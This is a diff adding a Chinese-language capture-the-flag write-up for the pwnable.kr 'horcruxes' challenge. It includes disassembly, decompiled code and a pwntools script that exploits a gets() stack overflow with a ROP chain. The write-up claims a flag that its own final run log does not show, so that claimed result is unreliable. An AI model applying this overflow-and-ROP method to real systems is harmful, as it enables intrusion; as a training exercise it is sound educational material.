@@ -11656,3 +11656,399 @@ congrats! here is your flag: Pl3as_DonT_Miss_youR_GrouP_Perm!!
 
 ------
 
+### horcruxes
+
+这是**Pwnable.kr**的第二十一个挑战`horcruxes`，来自**[Toddler's Bottle]**部分。好家伙，`who-you-know`和他的魂器出现啦。
+
+```bash
+Voldemort concealed his splitted soul inside 7 horcruxes.
+Find all horcruxes, and ROP it!
+author: jiwon choi
+
+ssh horcruxes@pwnable.kr -p2222 (pw:guest)
+```
+
+首先通过`ssh`远程连接目标主机。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
+└─$ ssh horcruxes@pwnable.kr -p2222
+horcruxes@pwnable.kr's password: 
+ ____  __    __  ____    ____  ____   _        ___      __  _  ____  
+|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
+|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
+|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    / 
+|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
+|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
+|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
+                                                                     
+- Site admin : daehee87@khu.ac.kr
+- irc.netgarage.org:6667 / #pwnable.kr
+- Simply type "irssi" command to join IRC now
+- files under /tmp can be erased anytime. make your directory under /tmp
+- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
+You have mail.
+Last login: Sat Jun 10 02:35:26 2023 from 223.38.36.141
+```
+
+然后输入`ls -la`显示所有文件及目录，并将文件型态、权限、拥有者、文件大小等信息详细列出。
+
+```bash
+horcruxes@pwnable:~$ ls -la
+total 36
+drwxr-x---   4 root horcruxes  4096 Aug  8  2018 .
+drwxr-xr-x 117 root root       4096 Nov 10  2022 ..
+-rwxr-xr-x   1 root root      12424 Aug  8  2018 horcruxes
+dr-xr-xr-x   2 root root       4096 Aug  8  2018 .irssi
+drwxr-xr-x   2 root root       4096 Aug  8  2018 .pwntools-cache
+-rw-r--r--   1 root root        131 Aug  8  2018 readme
+```
+
+发现两个关键文件：`horcruxes`和`readme`。先来看看`readme`，并查看`horcruxes`的文件保护情况。
+
+```bash
+horcruxes@pwnable:~$ cat readme
+connect to port 9032 (nc 0 9032). the 'horcruxes' binary will be executed under horcruxes_pwn privilege.
+rop it to read the flag.
+horcruxes@pwnable:~$ checksec ./horcruxes
+[*] '/home/horcruxes/horcruxes'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x809f000)
+```
+
+一旦`nc`连接到`9032`端口，二进制文件`horcruxes`（含有flag）将在`horcruxes_pwn`权限下执行。我们可以把`horcruxes`下载到本地。
+
+```python
+from pwn import *
+
+context(arch='amd64', os='linux', log_level='debug')
+shell = ssh(user='horcruxes', host='pwnable.kr', port=2222, password='guest')
+shell.download("/home/horcruxes/horcruxes", "./horcruxes")
+```
+
+用`pwndbg`对二进制文件`horcruxes`进行分析。先反编译主函数，发现程序调用了三个自定义函数`hint*()`，`init_ABCDEFG()`和`ropme()`。太长了，要不用`IDA Pro`反汇编再审计代码。
+
+```assembly
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
+└─$ gdb ./horcruxes 
+pwndbg> disass main
+Dump of assembler code for function main:
+   0x0809ff24 <+0>:     lea    ecx,[esp+0x4]
+   0x0809ff28 <+4>:     and    esp,0xfffffff0
+   0x0809ff2b <+7>:     push   DWORD PTR [ecx-0x4]
+   0x0809ff2e <+10>:    push   ebp
+   0x0809ff2f <+11>:    mov    ebp,esp
+   0x0809ff31 <+13>:    push   ecx
+   0x0809ff32 <+14>:    sub    esp,0x14
+   0x0809ff35 <+17>:    mov    eax,ds:0x80a2064
+   0x0809ff3a <+22>:    push   0x0
+   0x0809ff3c <+24>:    push   0x2
+   0x0809ff3e <+26>:    push   0x0
+   0x0809ff40 <+28>:    push   eax
+   0x0809ff41 <+29>:    call   0x809fcf0 <setvbuf@plt>
+   0x0809ff46 <+34>:    add    esp,0x10
+   0x0809ff49 <+37>:    mov    eax,ds:0x80a2060
+   0x0809ff4e <+42>:    push   0x0
+   0x0809ff50 <+44>:    push   0x2
+   0x0809ff52 <+46>:    push   0x0
+   0x0809ff54 <+48>:    push   eax
+   0x0809ff55 <+49>:    call   0x809fcf0 <setvbuf@plt>
+   0x0809ff5a <+54>:    add    esp,0x10
+   0x0809ff5d <+57>:    sub    esp,0xc
+   0x0809ff60 <+60>:    push   0x3c
+   0x0809ff62 <+62>:    call   0x809fc90 <alarm@plt>
+   0x0809ff67 <+67>:    add    esp,0x10
+   0x0809ff6a <+70>:    call   0x80a0324 <hint>             # 调用函数 hint
+   0x0809ff6f <+75>:    call   0x80a0177 <init_ABCDEFG>     # 调用函数 init_ABCDEFG 
+   0x0809ff74 <+80>:    sub    esp,0xc
+   0x0809ff77 <+83>:    push   0x0
+   0x0809ff79 <+85>:    call   0x809fc20 <seccomp_init@plt>
+   0x0809ff7e <+90>:    add    esp,0x10
+   0x0809ff81 <+93>:    mov    DWORD PTR [ebp-0xc],eax
+   0x0809ff84 <+96>:    push   0x0
+   0x0809ff86 <+98>:    push   0xad
+   0x0809ff8b <+103>:   push   0x7fff0000
+   0x0809ff90 <+108>:   push   DWORD PTR [ebp-0xc]
+   0x0809ff93 <+111>:   call   0x809fc60 <seccomp_rule_add@plt>
+   0x0809ff98 <+116>:   add    esp,0x10
+   0x0809ff9b <+119>:   push   0x0
+   0x0809ff9d <+121>:   push   0x5
+   0x0809ff9f <+123>:   push   0x7fff0000
+   0x0809ffa4 <+128>:   push   DWORD PTR [ebp-0xc]
+   0x0809ffa7 <+131>:   call   0x809fc60 <seccomp_rule_add@plt>
+   0x0809ffac <+136>:   add    esp,0x10
+   0x0809ffaf <+139>:   push   0x0
+   0x0809ffb1 <+141>:   push   0x3
+   0x0809ffb3 <+143>:   push   0x7fff0000
+   0x0809ffb8 <+148>:   push   DWORD PTR [ebp-0xc]
+   0x0809ffbb <+151>:   call   0x809fc60 <seccomp_rule_add@plt>
+   0x0809ffc0 <+156>:   add    esp,0x10
+   0x0809ffc3 <+159>:   push   0x0
+   0x0809ffc5 <+161>:   push   0x4
+   0x0809ffc7 <+163>:   push   0x7fff0000
+   0x0809ffcc <+168>:   push   DWORD PTR [ebp-0xc]
+   0x0809ffcf <+171>:   call   0x809fc60 <seccomp_rule_add@plt>
+   0x0809ffd4 <+176>:   add    esp,0x10
+   0x0809ffd7 <+179>:   push   0x0
+   0x0809ffd9 <+181>:   push   0xfc
+   0x0809ffde <+186>:   push   0x7fff0000
+   0x0809ffe3 <+191>:   push   DWORD PTR [ebp-0xc]
+   0x0809ffe6 <+194>:   call   0x809fc60 <seccomp_rule_add@plt>
+   0x0809ffeb <+199>:   add    esp,0x10
+   0x0809ffee <+202>:   sub    esp,0xc
+   0x0809fff1 <+205>:   push   DWORD PTR [ebp-0xc]
+   0x0809fff4 <+208>:   call   0x809fc80 <seccomp_load@plt>
+   0x0809fff9 <+213>:   add    esp,0x10
+   0x0809fffc <+216>:   call   0x80a0009 <ropme>        # 调用函数 ropme
+   0x080a0001 <+221>:   mov    ecx,DWORD PTR [ebp-0x4]
+   0x080a0004 <+224>:   leave  
+   0x080a0005 <+225>:   lea    esp,[ecx-0x4]
+   0x080a0008 <+228>:   ret    
+End of assembler dump.
+```
+
+用`IDA Pro 32bit`打开二进制文件`horcruxes`，按`F5`反汇编源码并查看主函数。
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int v4; // [esp+Ch] [ebp-Ch]
+
+  setvbuf(stdout, 0, 2, 0);
+  setvbuf(stdin, 0, 2, 0);
+  alarm(0x3Cu);
+  hint();
+  init_ABCDEFG();
+  v4 = seccomp_init(0);
+  seccomp_rule_add(v4, 2147418112, 173, 0);
+  seccomp_rule_add(v4, 2147418112, 5, 0);
+  seccomp_rule_add(v4, 2147418112, 3, 0);
+  seccomp_rule_add(v4, 2147418112, 4, 0);
+  seccomp_rule_add(v4, 2147418112, 252, 0);
+  seccomp_load(v4);
+  return ropme();
+}
+```
+
+双击`hint()`看到以下内容，让我们收集七个魂器并摧毁它。好家伙！~~可是我是麻瓜呐！~~
+
+```c
+int hint()
+{
+  puts("Voldemort concealed his splitted soul inside 7 horcruxes.");
+  return puts("Find all horcruxes, and destroy it!\n");
+}
+```
+
+来看`init_ABCDEFG()`函数，这七个字母可能分别代表不同的魂器吧。~~来自麻瓜的猜想。~~
+
+```c
+int init_ABCDEFG()
+{
+  int result; // eax
+  unsigned int buf; // [esp+8h] [ebp-10h] BYREF
+  int fd; // [esp+Ch] [ebp-Ch]
+
+  fd = open("/dev/urandom", 0);
+  if ( read(fd, &buf, 4u) != 4 )
+  {
+    puts("/dev/urandom error");
+    exit(0);
+  }
+  close(fd);
+  srand(buf);
+  a = -559038737 * rand() % 0xCAFEBABE;
+  b = -559038737 * rand() % 0xCAFEBABE;
+  c = -559038737 * rand() % 0xCAFEBABE;
+  d = -559038737 * rand() % 0xCAFEBABE;
+  e = -559038737 * rand() % 0xCAFEBABE;
+  f = -559038737 * rand() % 0xCAFEBABE;
+  g = -559038737 * rand() % 0xCAFEBABE;
+  result = f + e + d + c + b + a + g;
+  sum = result;
+  return result;
+}
+```
+
+再来看看`ropme()`中的代码，这函数名真够直白的哈。其中`get()`函数存在栈溢出漏洞，可以用`0x74+0x4`个字节填充`padding`。
+
+```c
+int ropme()
+{
+  char s[100]; // [esp+4h] [ebp-74h] BYREF
+  int v2; // [esp+68h] [ebp-10h] BYREF
+  int fd; // [esp+6Ch] [ebp-Ch]
+
+  printf("Select Menu:");
+  __isoc99_scanf("%d", &v2);
+  getchar();
+  if ( v2 == a )
+  {
+    A();
+  }
+  else if ( v2 == b )
+  {
+    B();
+  }
+  else if ( v2 == c )
+  {
+    C();
+  }
+  else if ( v2 == d )
+  {
+    D();
+  }
+  else if ( v2 == e )
+  {
+    E();
+  }
+  else if ( v2 == f )
+  {
+    F();
+  }
+  else if ( v2 == g )
+  {
+    G();
+  }
+  else
+  {
+    printf("How many EXP did you earned? : ");
+    gets(s);
+    if ( atoi(s) == sum )
+    {
+      fd = open("flag", 0);     // 尝试直接利用栈溢出漏洞劫持程序输出flag未果
+      s[read(fd, s, 0x64u)] = 0;
+      puts(s);
+      close(fd);
+      exit(0);
+    }
+    puts("You'd better get more experience to kill Voldemort");
+  }
+  return 0;
+}
+```
+
+我直接把这几个魂器放一块吧。
+
+```c
+int A()
+{
+  return printf("You found \"Tom Riddle's Diary\" (EXP +%d)\n", a);         // 汤姆·里德尔的日记
+}
+
+int B()
+{
+  return printf("You found \"Marvolo Gaunt's Ring\" (EXP +%d)\n", b);       // 马沃罗·冈特的戒指
+}
+
+int C()
+{
+  return printf("You found \"Helga Hufflepuff's Cup\" (EXP +%d)\n", c);     // 赫奇帕奇的金杯
+}
+
+int D()
+{
+  return printf("You found \"Salazar Slytherin's Locket\" (EXP +%d)\n", d);  // 斯莱特林挂坠盒
+}
+
+int E()
+{
+  return printf("You found \"Rowena Ravenclaw's Diadem\" (EXP +%d)\n", e);   // 拉文克劳的金冕
+}
+
+int F()
+{
+  return printf("You found \"Nagini the Snake\" (EXP +%d)\n", f);           // 纳吉尼
+}
+
+int G()
+{
+  return printf("You found \"Harry Potter\" (EXP +%d)\n", g);              // 哈利·波特
+}
+```
+
+编写`Python代码`进行求解，可以得到`flag`：`Magic_spell_1s_4vad4_K3daVr4!`。
+
+```python
+from pwn import *
+import re
+
+context(arch='amd64', os='linux', log_level='debug')
+# shell = ssh(user='horcruxes', host='pwnable.kr', port=2222, password='guest')
+# shell.download("/home/horcruxes/horcruxes", "./horcruxes")
+# io = shell.process('./horcruxes')  # too slow
+io = remote('pwnable.kr', 9032)
+elf = ELF('./horcruxes')
+A_addr = elf.symbols['A']  # 0x809fe4b
+log.success("Tom Riddle's Diary => %s", hex(A_addr))
+B_addr = elf.symbols['B']  # 0x809fe6a
+log.success("Marvolo Gaunt's Ring => %s", hex(B_addr))
+C_addr = elf.symbols['C']  # 0x809fe89
+log.success("Helga Hufflepuff's Cup => %s", hex(C_addr))
+D_addr = elf.symbols['D']  # 0x809fea8
+log.success("Salazar Slytherin's Locket => %s", hex(D_addr))
+E_addr = elf.symbols['E']  # 0x809fec7
+log.success("Rowena Ravenclaw's Diadem => %s", hex(E_addr))
+F_addr = elf.symbols['F']  # 0x809fee6
+log.success("Nagini the Snake => %s", hex(F_addr))
+G_addr = elf.symbols['G']  # 0x809ff05
+log.success("Harry Potter => %s", hex(G_addr))
+ropme_addr = elf.symbols['ropme']  # 0x80a0009
+call_ropme = 0x809fffc
+io.sendlineafter(b'Select Menu:', b'1')
+io.recvuntil(b'How many EXP did you earned? : ')
+padding = b'A'*(0x74+0x4)
+payload = padding + flat(A_addr, B_addr, C_addr, D_addr, E_addr, F_addr, G_addr, call_ropme)
+io.sendline(payload)
+sleep(2)
+msg = io.recv(1024).decode()
+log.info(msg)
+matches = re.findall(r'([\w-][\d]+)', msg)
+result = sum(list(map(int, matches)))
+log.success('result => {}'.format(result))
+io.sendline(b'1')
+io.recvuntil(b'How many EXP did you earned? : ')
+io.sendline(str(result).encode())
+flag = io.recvline().decode()   # Magic_spell_1s_4vad4_K3daVr4!
+log.success(flag) 
+io.close()
+```
+
+利用栈溢出漏洞ROP打败伏地魔的过程就很丝滑！
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
+└─$ python horcruxes.py
+[+] Opening connection to pwnable.kr on port 9032: Done
+[*] '/home/tyd/ctf/pwn/pwnable.kr/horcruxes'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x809f000)
+[+] Tom Riddle's Diary => 0x809fe4b
+[+] Marvolo Gaunt's Ring => 0x809fe6a
+[+] Helga Hufflepuff's Cup => 0x809fe89
+[+] Salazar Slytherin's Locket => 0x809fea8
+[+] Rowena Ravenclaw's Diadem => 0x809fec7
+[+] Nagini the Snake => 0x809fee6
+[+] Harry Potter => 0x809ff05
+[*] You'd better get more experience to kill Voldemort
+    You found "Tom Riddle's Diary" (EXP +590843447)
+    You found "Marvolo Gaunt's Ring" (EXP +1015663338)
+    You found "Helga Hufflepuff's Cup" (EXP +835005618)
+    You found "Salazar Slytherin's Locket" (EXP +628068732)
+    You found "Rowena Ravenclaw's Diadem" (EXP +1958224011)
+    You found "Nagini the Snake" (EXP +-1513563442)
+    You found "Harry Potter" (EXP +1991018278)
+    Select Menu:
+[+] result => 5505259982
+[+] Flag: You'd better get more experience to kill Voldemort
+[*] Closed connection to pwnable.kr port 9032
+```
+
+------
+
